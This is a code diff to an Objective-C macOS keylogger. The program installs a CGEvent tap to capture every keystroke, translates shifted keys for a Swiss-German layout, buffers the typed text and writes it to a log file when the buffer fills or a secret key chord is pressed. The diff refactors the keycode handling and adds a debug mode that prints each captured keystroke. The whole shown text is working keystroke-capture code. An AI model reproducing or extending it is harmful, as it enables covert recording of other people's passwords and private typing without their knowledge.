@@ -56,11 +56,13 @@ typedef struct {
     const NSString *red;
     const NSString *blue;
     const NSString *reset;
+    const NSString *yellow;
 } Colours;
 const static Colours colours = {
     @"\x1b[31;1m",
     @"\x1b[34;1m",
     @"\x1b[0m",
+    @"\x1b[33;1m",
 };
 
 // Fn decl
@@ -182,8 +184,9 @@ CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
     // Get keycode
     if ((kCGEventKeyDown == type) || (kCGEventKeyUp == type)) {
         // Hanle special keys
+        NSString *keycode = keyCodeToString(event, type);
         NSMutableString *dumpKeychord = stringBuilder([NSString stringWithUTF8String: DUMP]);
-        NSString *actualKeychord = [NSString stringWithFormat: @"%@%@", keyMods, keyCodeToString(event, type)];
+        NSString *actualKeychord = [NSString stringWithFormat: @"%@%@", keyMods, keycode];
         if ([dumpKeychord isEqual: actualKeychord]) {
             logma();
         }
@@ -196,47 +199,53 @@ CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef eve
         // handle modifiers
         if ([keyMods rangeOfString: @"shift"].location != NSNotFound || [keyMods rangeOfString: @"caps"].location != NSNotFound) {
             // special keys for swiss-german keyboard
-            if ([keyCodeToString(event, type) isEqualToString: @"."]) {
+            if ([keycode isEqualToString: @"."]) {
                 [buf appendString: @":"];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"-"]) {
+            } else if ([keycode isEqualToString: @"-"]) {
                 [buf appendString: @"_"];
-            } else if ([keyCodeToString(event, type) isEqualToString: @","]) {
+            } else if ([keycode isEqualToString: @","]) {
                 [buf appendString: @";"];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"<"]) {
+            } else if ([keycode isEqualToString: @"<"]) {
                 [buf appendString: @">"];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"'"]) {
+            } else if ([keycode isEqualToString: @"'"]) {
                 [buf appendString: @"?"];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"2"]) {
+            } else if ([keycode isEqualToString: @"2"]) {
                 [buf appendString: @"\""];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"9"]) {
+            } else if ([keycode isEqualToString: @"9"]) {
                 [buf appendString: @")"];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"8"]) {
+            } else if ([keycode isEqualToString: @"8"]) {
                 [buf appendString: @"("];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"7"]) {
+            } else if ([keycode isEqualToString: @"7"]) {
                 [buf appendString: @"/"];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"6"]) {
+            } else if ([keycode isEqualToString: @"6"]) {
                 [buf appendString: @"&"];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"5"]) {
+            } else if ([keycode isEqualToString: @"5"]) {
                 [buf appendString: @"%"];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"4"]) {
+            } else if ([keycode isEqualToString: @"4"]) {
                 [buf appendString: @"Ç"];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"3"]) {
+            } else if ([keycode isEqualToString: @"3"]) {
                 [buf appendString: @"*"];
-            } else if ([keyCodeToString(event, type) isEqualToString: @"1"]) {
+            } else if ([keycode isEqualToString: @"1"]) {
                 [buf appendString: @"+"];
             }
             else {
-                [buf appendString: [keyCodeToString(event, type) uppercaseString]];
+                [buf appendString: [keycode uppercaseString]];
             }
+        // ignore ctrl alt or cmd
         } else if ([keyMods rangeOfString: @"ctrl"].location != NSNotFound) {
         } else if ([keyMods rangeOfString: @"alt"].location != NSNotFound) {
         } else if ([keyMods rangeOfString: @"cmd"].location != NSNotFound) {
         } else {
             [buf appendString: keyCodeToString(event, type)];
         }
-        /* printf("%lu\n", buf.length); */
         if ([buf length] >= BUFSIZE) {
             logma();
+        }
+        if (DEBUG) {
+            NSMutableString *printable = [[NSMutableString alloc] init];
+            [printable appendString: keyMods];
+            [printable appendString: keycode];
+            printf("%sDebug%s :: Keystroke '%s'\n", colours.yellow.UTF8String, colours.reset.UTF8String, printable.UTF8String);
         }
     }
     // return
@@ -276,7 +285,7 @@ NSMutableString *stringBuilder(NSString *keychord) {
 /* logma: log the buf contents to the logfile */
 void logma() {
     if (DEBUG) {
-        printf("%sLogger%s :: Logging to file\n", colours.blue.UTF8String, colours.reset.UTF8String);
+        printf("%sDebug%s :: Logging to file\n", colours.yellow.UTF8String, colours.reset.UTF8String);
     }
     NSFileManager *manager = [NSFileManager defaultManager];
     NSString *path = [NSString stringWithUTF8String: LOG_FILE_PATH];
